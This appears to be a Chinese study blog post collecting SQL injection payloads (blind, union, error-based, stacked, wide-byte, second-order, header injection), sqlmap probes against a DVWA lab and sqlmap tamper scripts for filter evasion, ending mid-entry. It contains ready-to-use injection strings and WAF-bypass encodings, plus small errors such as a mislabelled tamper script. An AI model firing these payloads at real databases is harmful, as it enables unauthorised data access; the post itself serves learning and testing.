    <url>/2020/06/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E6%94%B6%E9%9B%86%E5%8F%8A%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfefq6pib1j31c00u01kx.jpg" alt="27"></p>
<a id="more"></a>

<h3 id="0x00-任务介绍"><a href="#0x00-任务介绍" class="headerlink" title="0x00 任务介绍"></a>0x00 任务介绍</h3><p>1、收集网络上各种 sql 注入时使用的 payload 并理解其适用的环境（检测注入、利用注入）</p>
<p>2、记录 sqlmap 的检测和利用过程中使用的 payload（也算一种 payload 收集方式）</p>
<p>3、理解以上涉及的 sql 语句的意思，其中会涉及不同的数据库、不同注入场景，可以将学习的过程和收集的方式进行整理形成报告，关于 payload 的理解，其中会涉及之前学习的基础。</p>
<p>扩展学习：理解 sqlmap 自带 tamper 的原理，这里通常包含很多数据库的特性，从而实现 payload 变形啥的，用来绕过一些简单的安全检测</p>
<h3 id="0x01-收集注入语句"><a href="#0x01-收集注入语句" class="headerlink" title="0x01 收集注入语句"></a>0x01 收集注入语句</h3><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p>1、布尔注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用场景</span><br><span class="line">	通过页面是否返回正常判定是否存在注入</span><br><span class="line">原理</span><br><span class="line">	以真假判断是否存在，真为正常，假为不正常(页面区别不大，需仔细辨别不同点来判断是否存在注入)</span><br><span class="line"></span><br><span class="line">测试流程</span><br><span class="line">  存在注入点，判断第一个数据库第一个字符是否等于c</span><br><span class="line">  	and substr(database(),3,1)&#x3D;&#39;c&#39;</span><br><span class="line">  判断数据库的第一张表的第一个字符是否等于a</span><br><span class="line">  	and (ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1)))&gt;97#</span><br><span class="line">  列名及数据同上，此处可使用burp遍历</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj6vvwe9j31ii0hqdie.jpg" alt="image-20200213013652627"></p>
<p>2、延时注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用场景</span><br><span class="line">		根据注入函数sleep来判断，若注入条件成立，则延长网页返回时间。</span><br><span class="line"></span><br><span class="line">原理</span><br><span class="line">		使用判断语句判断条件是否正确。if(exp1,exp2,exp3),若第一个条件成立，则执行第二条，反之第三条</span><br><span class="line"></span><br><span class="line">测试流程</span><br><span class="line">  数据库名如果等于8个字符，网页延时10秒</span><br><span class="line">  	and if(length(database())&#x3D;8,sleep(10),1)</span><br><span class="line">  数据库的第一个字符如果等于a，页面延时10秒</span><br><span class="line">  	and if(substr(database(),1,1)&#x3D;&#39;a&#39;,sleep(10),1)</span><br><span class="line">  数据库第一张表的第一个字符如果等于a，页面延时10秒</span><br><span class="line"> 	 and if(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;数据库名&#39; limit 0,1),1,1)&#x3D;&#39;a&#39;,sleep(10),1)--+</span><br><span class="line">  列名及数据同上，此处可使用burp遍历</span><br></pre></td></tr></table></figure>



<h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用场景</span><br><span class="line">	页面必须有显示位，客户端将数据展示在页面中，展示数据的位置就叫显示位</span><br><span class="line">流程</span><br><span class="line">  判断是否存在注入点</span><br><span class="line">  判断字段 order by n</span><br><span class="line">  union select 1,2,...,n</span><br><span class="line">  显示报错位</span><br><span class="line">  在报错位置写入注入语句</span><br></pre></td></tr></table></figure>

<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>利用场景：</p>
<p>​    页面无显示位，但是有sql注入语句执行错误信息显示。</p>
<p>1、floor报错注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">原理</span><br><span class="line">	报错基于count,rand,group by三者，floor(rand(0)*2))报错条件记录必须大于3条以上,</span><br><span class="line">	floor(rand(0)*2))，随机数*2后向下取整</span><br><span class="line">	count(*), group by，创建一张虚拟表来统计所有数据，虚拟表中有唯一主键值，floor(rand(0)*2))让主键值重复，并抛出主键异常报错</span><br><span class="line"></span><br><span class="line">查询数据库版本</span><br><span class="line">and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span><br><span class="line">	 </span><br><span class="line">查询数据库</span><br><span class="line">and (select 1 from(select+count(*),concat(floor(rand(0)*2),database())a from information_schema.tables group by a)b)%23</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj6utkrhj31c60dg76k.jpg" alt="image-20200213003231964"></p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj6x5owqj31c00ds0uu.jpg" alt="image-20200213003529570"></p>
<p>2、updatexml报错注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">原理</span><br><span class="line">		updatexml的第二个参数需要xpath格式字符串，0x7e不是xpath格式语句，所以会将中间执行结果以错误形式报出。</span><br><span class="line">		</span><br><span class="line">查询数据库版本信息</span><br><span class="line">		and updatexml(1,concat(0x7e,@@version,0x7e),1)</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj6wqv8wj318u02m0tm.jpg" alt="image-20200213010305239"></p>
<p>3、ExtractValue报错注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">原理同updatexml一样</span><br><span class="line">	updatexml的第二个参数需要xpath格式字符串，0x7e不是xpath格式语句，所以会将中间执行结果以错误形式报出。</span><br><span class="line">	</span><br><span class="line">查询数据库版本信息</span><br><span class="line">		and extractvalue(1,concat(0x7e,@@version,0x7e))</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj6v92fuj317k02smy1.jpg" alt="image-20200213011351107"></p>
<h4 id="堆查询注入"><a href="#堆查询注入" class="headerlink" title="堆查询注入"></a>堆查询注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用场景 </span><br><span class="line">	可用于执行多条sql语句，以;分割，堆注入通过第二条语句来执行自己需要构造的语句。</span><br><span class="line">原理</span><br><span class="line">	堆叠注入可同时使用多条语句，使用;分割，判断存在注入，则可使用堆叠注入构造要执行的语句。</span><br><span class="line">	可结合时间盲注、布尔盲注</span><br><span class="line"></span><br><span class="line">测试流程</span><br><span class="line">	判断第一个数据库的长度大于10，页面延时4秒</span><br><span class="line">		;select if(length(database())&gt;10,sleep(4),1)</span><br><span class="line">	判断第一个数据库，第一个字符是否等于s，如果存在页面延时4秒</span><br><span class="line">		;select if(substr(database(),1,1)&#x3D;&#39;s&#39;,sleep(4),1)</span><br></pre></td></tr></table></figure>



<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用场景</span><br><span class="line">	mysql数据库字符编码为gbk时，会认为两个字符为一个汉字。</span><br><span class="line">原理</span><br><span class="line">	宽字节注入发生在数据库编码为gbk的情况下，需要绕过\，代码使用\’过滤单引号情况下</span><br><span class="line">	\编码是%5c，%df%5c可以组成一个中文字符“連”，使用%df可以将%5c吃掉组成一个中文字符，则可以成功绕过\</span><br><span class="line"></span><br><span class="line">测试流程</span><br><span class="line">	判断存在注入并且被转义，此时数据库是gkb编码，id&#x3D;&#39;1%df%5c&#39; union select 1,...,n#&#39;</span><br><span class="line">	可以绕过转义进行注入</span><br></pre></td></tr></table></figure>



<h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用场景</span><br><span class="line">	开发者对插入数据库恶意语句进行转义，但在恶意数据插入数据库时被处理的数据又被还原并存储在数据库中。</span><br><span class="line">原理</span><br><span class="line">	根据写入数据库的特殊数据结合数据库正常语句执行后形成的二次注入，代码中转义或过滤了敏感字符，但写入</span><br><span class="line">	数据库未过滤敏感字符，将用户写入的数据完整的存入数据库而导致的二次注入</span><br><span class="line"></span><br><span class="line">测试流程</span><br><span class="line">  创建一个特殊流程，test&#39;--,数据库语句：</span><br><span class="line">  	insert into test(user,password) values(&#39;test&#39;&#39;,&#39;1234&#39;);</span><br><span class="line">  此时存在一个正常用户，test,修改密码，此时数据库语句如下</span><br><span class="line">  	update users set pawweord&#x3D;&#39;yes&#39; user&#x3D;&#39;test&#39;--&#39; and old_pass&#x3D;&#39;1234&#39;</span><br><span class="line">  等于&#39;--注释掉后面的所有语句，执行了此条语句</span><br><span class="line"> 		update users set pawweord&#x3D;&#39;yes&#39; user&#x3D;&#39;test&#39;</span><br><span class="line">  用户从test&#39;--变成了test，修改了正常用户test的密码。</span><br></pre></td></tr></table></figure>



<h4 id="xff-x-forwarded-for-注入"><a href="#xff-x-forwarded-for-注入" class="headerlink" title="xff(x-forwarded-for)注入"></a>xff(x-forwarded-for)注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">原理</span><br><span class="line">	使用burp重放模块修改x-forwarded-for值，可用于伪造ip</span><br><span class="line"></span><br><span class="line">测试流程</span><br><span class="line">	x-forwarded-for:127.0.0.1&#39; and 1&#x3D;1# 判断是否存在注入，存在返回正常，不存在返回报错</span><br></pre></td></tr></table></figure>



<h4 id="偏移注入"><a href="#偏移注入" class="headerlink" title="偏移注入"></a>偏移注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">原理</span><br><span class="line">	已知user表存在8个字段，判断存在admin表，但不知道有几个字段，可通过偏移注入查询</span><br><span class="line"></span><br><span class="line">测试流程</span><br><span class="line">		union select 1,2,3,4,5,6,7,8 from user   user表</span><br><span class="line">	查询admin表,使用admin.*来偏移，判断admin表存在几个字段</span><br><span class="line">		union select 1,2,3,4,5,6,7,admin.* from user</span><br><span class="line">		union select 1,2,3,4,5,admin.* from user 返回正常，则admin表存在3个字段</span><br><span class="line">	偏移注入试用于access数据库</span><br></pre></td></tr></table></figure>



<h3 id="0x02-SqlMap-Payload收集"><a href="#0x02-SqlMap-Payload收集" class="headerlink" title="0x02 SqlMap Payload收集"></a>0x02 SqlMap Payload收集</h3><p>sqlmap支持五种不同的注入模式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。 </span><br><span class="line"></span><br><span class="line">2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页 面返回时间是否增加）来判断。 </span><br><span class="line"></span><br><span class="line">3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。 </span><br><span class="line"></span><br><span class="line">4、联合查询注入，可以使用union的情况下的注入。 </span><br><span class="line"></span><br><span class="line">5、堆查询注入，可以同时执行多条语句的执行时的注入。</span><br></pre></td></tr></table></figure>

<p>sqlmap支持的数据库有：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MySQL</span><br><span class="line">Oracle</span><br><span class="line">PostgreSQL</span><br><span class="line">Microsoft SQL Server</span><br><span class="line">Microsoft Access</span><br><span class="line">IBM DB2</span><br><span class="line">SQLite</span><br><span class="line">Firebird</span><br><span class="line">Sybase</span><br><span class="line">SAP MaxDB</span><br></pre></td></tr></table></figure>

<p>sqlmap对一个点是进行了怎样的尝试判断以及读取数据，可以使用-v参数。共有七个等级，默认为1：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0、只显示python错误以及严重的信息。 </span><br><span class="line"></span><br><span class="line">1、同时显示基本信息和警告信息。（默认） </span><br><span class="line"></span><br><span class="line">2、同时显示debug信息。 </span><br><span class="line"></span><br><span class="line">3、同时显示注入的payload。</span><br><span class="line"></span><br><span class="line">4、同时显示HTTP请求。 </span><br><span class="line"></span><br><span class="line">5、同时显示HTTP响应头。 </span><br><span class="line"></span><br><span class="line">6、同时显示HTTP响应页面。</span><br></pre></td></tr></table></figure>



<p>函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ORD(string) ：返回字符串首字符的ASCII码值。</span><br><span class="line"></span><br><span class="line">MID(string，start，length) ：返回字符串的从start开始长度为length的字符串。</span><br><span class="line"></span><br><span class="line">IFNULL(string1，string2) ：如果string1是NULL则返回string2，如果不是NULL返回string1。</span><br><span class="line"></span><br><span class="line">CAST(volume as type) 用于数据类型转换，将volume转换成type类型的数据（如这里是将数字转换为字符串）。</span><br><span class="line"></span><br><span class="line">COUNT()： 统计个数。</span><br><span class="line"></span><br><span class="line">DISTINCT()： 标记只要不同（唯一）的值。</span><br><span class="line"></span><br><span class="line">INFORMATION_SCHEMA是mysql自带的一个访问元数据的数据库，也就是数据库信息，里面有很多表，在这里使用了SCHEMATA表这个表储存的是所有数据库的信息。</span><br></pre></td></tr></table></figure>

<p>获取数据库名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4 AND ORD(MID((SELECTDISTINCT(IFNULL(CAST(schema_name AS CHAR),0x20))FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),1,1)) &gt;64</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LIMIT 0,1意思是取出第一个数据库。 LIMIT的意思是限定到的条目的位置以及数量，第一个参数是代表偏移量（从0开始，0即代表不偏移从第一个 开始），第二个参数代表返回的数量。</span><br></pre></td></tr></table></figure>

<p>获取表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema&#x3D;0x64767761 LIMIT 0,1),1,1))&gt;64</span><br></pre></td></tr></table></figure>

<p>获取所有字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4 AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name&#x3D;0x7573657273 AND table_schema&#x3D;0x64767761),1,1))&gt;51</span><br></pre></td></tr></table></figure>

<p>获取第一个字段名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name&#x3D;0x7573657273 AND table_schema&#x3D;0x64767761 LIMIT 0,1),1,1))&gt;64</span><br></pre></td></tr></table></figure>

<p>获取字段中数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4 AND ORD(MID((SELECT IFNULL(CAST(&#96;user&#96; AS CHAR),0x20) FROM dvwa.users ORDER BY &#96;user&#96; LIMIT 0,1),1,1))&gt;64</span><br></pre></td></tr></table></figure>



<h3 id="0x03-常用的tamper脚本"><a href="#0x03-常用的tamper脚本" class="headerlink" title="0x03 常用的tamper脚本"></a>0x03 常用的tamper脚本</h3><ol>
<li>apostrophemask.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ALL</span><br><span class="line"></span><br><span class="line">作用：将引号替换为utf-8，用于过滤单引号</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&quot;1 AND &#39;1&#39;&#x3D;&#39;1&quot;)</span><br><span class="line"></span><br><span class="line">使用脚本后：1 AND %EF%BC%871%EF%BC%87&#x3D;%EF%BC%871</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>base64encode.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ALL</span><br><span class="line"></span><br><span class="line">作用：替换为base64编码</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&quot;1&#39; AND SLEEP(5)#&quot;)</span><br><span class="line"></span><br><span class="line">使用脚本后：MScgQU5EIFNMRUVQKDUpIw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>multiplespaces.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ALL</span><br><span class="line"></span><br><span class="line">作用：围绕sql关键字添加多个空格</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;1 UNION SELECT foobar&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：1 UNION SELECT foobar</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>space2plus.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ALL</span><br><span class="line"></span><br><span class="line">作用：用加号替换空格</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;SELECT id FROM users&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：SELECT+id+FROM+users</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>nonrecursivereplacement.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ALL</span><br><span class="line"></span><br><span class="line">作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将</span><br><span class="line"></span><br><span class="line">select替换为空）</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;1 UNION SELECT 2--&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：1 UNIOUNIONN SELESELECTCT 2--</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>space2randomblank.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ALL</span><br><span class="line"></span><br><span class="line">作用：将空格替换为其他有效字符</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;SELECT id FROM users&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：SELECT%0Did%0DFROM%0Ausers</span><br></pre></td></tr></table></figure>

<ol start="7">
<li>unionalltounion.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ALL</span><br><span class="line"></span><br><span class="line">作用：将union allselect 替换为unionselect</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;-1 UNION ALL SELECT&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：-1 UNION SELECT</span><br></pre></td></tr></table></figure>

<ol start="8">
<li>securesphere.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ALL</span><br><span class="line"></span><br><span class="line">作用：追加特定的字符串</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;1 AND 1&#x3D;1&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：1 AND 1&#x3D;1 and &#39;0having&#39;&#x3D;&#39;0having&#39;</span><br></pre></td></tr></table></figure>

<ol start="9">
<li>space2dash.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ALL</span><br><span class="line"></span><br><span class="line">作用：将空格替换为--，并添加一个随机字符串和换行符</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;1 AND 9227&#x3D;9227&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227&#x3D;9227</span><br></pre></td></tr></table></figure>

<ol start="10">
<li>space2mssqlblank.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：Microsoft SQL Server</span><br><span class="line"></span><br><span class="line">测试通过数据库：Microsoft SQL Server 2000、Microsoft SQL Server 2005</span><br><span class="line"></span><br><span class="line">作用：将空格随机替换为其他空格符号(&#39;%01&#39;, &#39;%02&#39;, &#39;%03&#39;, &#39;%04&#39;, &#39;%05&#39;, &#39;%06&#39;, &#39;%07&#39;,</span><br><span class="line"></span><br><span class="line"> &#39;%08&#39;, &#39;%09&#39;, &#39;%0B&#39;, &#39;%0C&#39;, &#39;%0D&#39;, &#39;%0E&#39;, &#39;%0F&#39;, &#39;%0A&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;SELECT id FROM users&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：SELECT%0Eid%0DFROM%07users</span><br></pre></td></tr></table></figure>

<ol start="11">
<li>percentage.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ASP</span><br><span class="line"></span><br><span class="line">测试通过数据库：Microsoft SQL Server 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL</span><br><span class="line"></span><br><span class="line">9.0</span><br><span class="line"></span><br><span class="line">作用：在每个字符前添加一个%</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;SELECT FIELD FROM TABLE&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</span><br></pre></td></tr></table></figure>

<ol start="12">
<li>sp_password.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：MSSQL</span><br><span class="line"></span><br><span class="line">作用：从T-SQL日志的自动迷糊处理的有效载荷中追加sp_password</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;1 AND 9227&#x3D;9227-- &#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：1 AND 9227&#x3D;9227-- sp_password</span><br></pre></td></tr></table></figure>

<ol start="13">
<li>charencode.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、 </span><br><span class="line"></span><br><span class="line">PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line"></span><br><span class="line">作用：对给定的payload全部字符使用url编码（不处理已经编码的字符）</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;SELECT FIELD FROM%20TABLE&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</span><br></pre></td></tr></table></figure>

<ol start="14">
<li>randomcase.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、 </span><br><span class="line"></span><br><span class="line">PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line"></span><br><span class="line">作用：随机大小写</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;INSERT&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：INseRt</span><br></pre></td></tr></table></figure>

<ol start="15">
<li>charunicodeencode.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ASP、ASP.NET</span><br><span class="line"></span><br><span class="line">测试通过数据库：Microsoft SQL Server 2000&#x2F;2005、MySQL 5.1.56、PostgreSQL 9.0.3</span><br><span class="line"></span><br><span class="line">作用：适用字符串的unicode编码</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;SELECT FIELD%20FROM TABLE&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：</span><br><span class="line"></span><br><span class="line">%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045</span><br></pre></td></tr></table></figure>

<ol start="16">
<li>space2comment.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line"></span><br><span class="line">作用：将空格替换为&#x2F;**&#x2F;</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;SELECT id FROM users&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：SELECT&#x2F;**&#x2F;id&#x2F;**&#x2F;FROM&#x2F;**&#x2F;users</span><br></pre></td></tr></table></figure>

<ol start="17">
<li>equaltolike.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5</span><br><span class="line"></span><br><span class="line">作用：将&#x3D;替换为LIKE</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;SELECT * FROM users WHERE id&#x3D;1&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：SELECT * FROM users WHERE id LIKE 1</span><br></pre></td></tr></table></figure>

<ol start="18">
<li>equaltolike.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">测试通过数据库：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line"></span><br><span class="line">作用：将&gt;替换为GREATEST，绕过对&gt;的过滤</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;1 AND A &gt; B&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：1 AND GREATEST(A,B+1)&#x3D;A</span><br></pre></td></tr></table></figure>

<ol start="19">
<li>ifnull2ifisnull.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：MySQL、SQLite (possibly)、SAP MaxDB (possibly)</span><br><span class="line"></span><br><span class="line">测试通过数据库：MySQL 5.0 and 5.5</span><br><span class="line"></span><br><span class="line">作用：将类似于IFNULL(A, B)替换为IF(ISNULL(A), B, A)，绕过对IFNULL的过滤</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;IFNULL(1, 2)&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：IF(ISNULL(1),2,1)</span><br></pre></td></tr></table></figure>

<ol start="20">
<li>modsecurityversioned.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：MySQL</span><br><span class="line"></span><br><span class="line">测试通过数据库：MySQL 5.0</span><br><span class="line"></span><br><span class="line">作用：过滤空格，使用mysql内联注释的方式进行注入</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;1 AND 2&gt;1--&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：1 &#x2F;*!30874AND 2&gt;1*&#x2F;--</span><br></pre></td></tr></table></figure>

<ol start="21">
<li>space2mysqlblank.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：MySQL</span><br><span class="line"></span><br><span class="line">测试通过数据库：MySQL 5.1</span><br><span class="line"></span><br><span class="line">作用：将空格替换为其他空格符号(&#39;%09&#39;, &#39;%0A&#39;, &#39;%0C&#39;, &#39;%0D&#39;, &#39;%0B&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;SELECT id FROM users&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：SELECT%0Bid%0DFROM%0Cusers</span><br></pre></td></tr></table></figure>

<ol start="22">
<li>modsecurityzeroversioned.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：MySQL</span><br><span class="line"></span><br><span class="line">测试通过数据库：MySQL 5.0</span><br><span class="line"></span><br><span class="line">作用：使用内联注释方式（&#x2F;*!00000*&#x2F;）进行注入</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;1 AND 2&gt;1--&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：1 &#x2F;*!00000AND 2&gt;1*&#x2F;--</span><br></pre></td></tr></table></figure>

<ol start="23">
<li>space2mysqldash.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：MySQL、MSSQL</span><br><span class="line"></span><br><span class="line">作用：将空格替换为 -- ，并追随一个换行符</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;1 AND 9227&#x3D;9227&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：1--%0AAND--%0A9227&#x3D;9227</span><br></pre></td></tr></table></figure>

<ol start="24">
<li>bluecoat.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：Blue Coat SGOS</span><br><span class="line"></span><br><span class="line">测试通过数据库：MySQL 5.1,、SGOS</span><br><span class="line"></span><br><span class="line">作用：在sql语句之后用有效的随机空白字符替换空格符，随后用LIKE替换&#x3D;</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;SELECT id FROM users where id &#x3D; 1&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：SELECT%09id FROM users where id LIKE 1</span><br></pre></td></tr></table></figure>

<ol start="25">
<li>versionedkeywords.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：MySQL</span><br><span class="line"></span><br><span class="line">测试通过数据库：MySQL 4.0.18, 5.1.56, 5.5.11</span><br><span class="line"></span><br><span class="line">作用：注释绕过</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;1 UNION ALL SELECT NULL, NULL,</span><br><span class="line"></span><br><span class="line">CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS</span><br><span class="line"></span><br><span class="line">CHAR),CHAR(32)),CHAR(58,100,114,117,58))#&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：1&#x2F;*!UNION*&#x2F;&#x2F;*!ALL*&#x2F;&#x2F;*!SELECT*&#x2F;&#x2F;*!NULL*&#x2F;,&#x2F;*!NULL*&#x2F;,</span><br><span class="line"></span><br><span 